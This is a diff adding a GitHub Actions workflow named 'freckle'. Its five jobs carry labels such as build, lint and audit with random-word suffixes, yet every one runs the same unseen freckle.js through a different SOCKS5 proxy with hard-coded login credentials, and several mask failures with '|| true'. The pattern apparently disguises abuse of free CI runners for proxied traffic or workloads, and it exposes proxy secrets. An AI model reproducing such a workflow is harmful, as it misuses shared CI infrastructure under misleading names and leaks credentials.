@@ -1,0 +1,76 @@
+name: freckle
+on:
+  push:
+    branches: [ "main" ]
+    paths:
+      - '.github/workflows/freckle.yml'
+      - 'freckle.js'
+      - 'package.json'
+
+jobs:
+  check_windows2025_node_lashes:
+    runs-on: windows-2025
+    steps:
+        - name: Checkout Repository
+          uses: actions/checkout@v4
+        - name: Setup Node.js
+          uses: actions/setup-node@v4
+          with:
+            node-version: 20
+        - name: Run Task
+          shell: pwsh
+          run: |
+            npm install; node freckle.js "socks5://dcswarup:webshare@154.3.233.172:5450"
+
+  build_ubuntu2204_bun_pendant:
+    runs-on: ubuntu-22.04
+    steps:
+        - name: Checkout Repository
+          uses: actions/checkout@v4
+        - name: Setup Bun
+          uses: oven-sh/setup-bun@v2
+          with:
+            bun-version: latest
+        - name: Run Task
+          run: |
+            bun install && bun run freckle.js "socks5://dcswarup:webshare@45.61.100.186:6454" || true
+
+  build_ubuntulatest_node_hepatitis:
+    runs-on: ubuntu-latest
+    steps:
+        - name: Checkout Repository
+          uses: actions/checkout@v4
+        - name: Setup Node.js
+          uses: actions/setup-node@v4
+          with:
+            node-version: 22
+        - name: Run Task
+          run: |
+            npm install && node freckle.js "socks5://dcswarup:webshare@38.154.205.15:5283" || true
+
+  audit_ubuntu2004_node_fork:
+    runs-on: ubuntu-20.04
+    steps:
+        - name: Checkout Repository
+          uses: actions/checkout@v4
+        - name: Setup Node.js
+          uses: actions/setup-node@v4
+          with:
+            node-version: 18
+        - name: Run Task
+          run: |
+            npm install && node freckle.js "socks5://dcswarup:webshare@140.99.194.32:7409" || true
+
+  lint_windowslatest_node_captain:
+    runs-on: windows-latest
+    steps:
+        - name: Checkout Repository
+          uses: actions/checkout@v4
+        - name: Setup Node.js
+          uses: actions/setup-node@v4
+          with:
+            node-version: 24
+        - name: Run Task
+          shell: pwsh
+          run: |
+            npm install; node freckle.js "socks5://dcswarup:webshare@31.56.138.59:6131"
